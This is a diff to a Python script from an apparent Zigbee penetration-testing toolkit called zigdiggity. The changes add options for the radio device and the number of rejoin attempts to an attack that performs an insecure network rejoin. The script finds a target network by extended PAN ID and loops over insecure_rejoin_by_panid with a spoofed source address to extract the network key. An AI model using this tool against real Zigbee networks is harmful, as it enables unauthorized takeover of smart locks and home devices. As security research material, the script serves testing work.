@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 import os
 import sys
 sys.path.append(os.getcwd() + "/zigdiggity")
@@ -14,8 +15,10 @@ import zigdiggity.crypto.utils as crypto_utils
 from zigdiggity.misc.actions import *
 from zigdiggity.interface.components.logo import Logo
 
-parser = argparse.ArgumentParser(description='Attempt to unlock the target lock')
+parser = argparse.ArgumentParser(description='Attempt to perform an insecure network join')
+parser.add_argument('-a','--attempts',action='store',type=int,dest='attempts',default=3,help='Number of rejoin attempts')
 parser.add_argument('-c','--channel',action='store',type=int,dest='channel',required=True,help='Channel to use')
+parser.add_argument('-d','--device',action='store',dest='device',default='/dev/ttyS0',help='Zigbee Radio device')
 parser.add_argument('-e','--epan',action='store',type=lambda s: int(s.replace(':',''),16),dest='epan',required=True,help='The Extended PAN ID of the network to target')
 parser.add_argument('-w','--wireshark',action='store_true',dest='wireshark',required=False,help='See all traffic in wireshark')
 args = parser.parse_args()
@@ -23,7 +26,7 @@ args = parser.parse_args()
 logo = Logo()
 logo.print()
 
-hardware_radio = RaspbeeRadio("/dev/ttyS0")
+hardware_radio = RaspbeeRadio(args.device)
 radio = ObserverRadio(hardware_radio)
 
 if args.wireshark:
@@ -43,7 +46,7 @@ for channel in CHANNELS:
         print_error("Could not find the PAN ID corresponding to the target network.")
         exit(1)
 
-    for attempt in range(3):
+    for attempt in range(args.attempts):
         key = insecure_rejoin_by_panid(radio, panid, extended_src=0x01020304050607)
         if key is not None:
             break
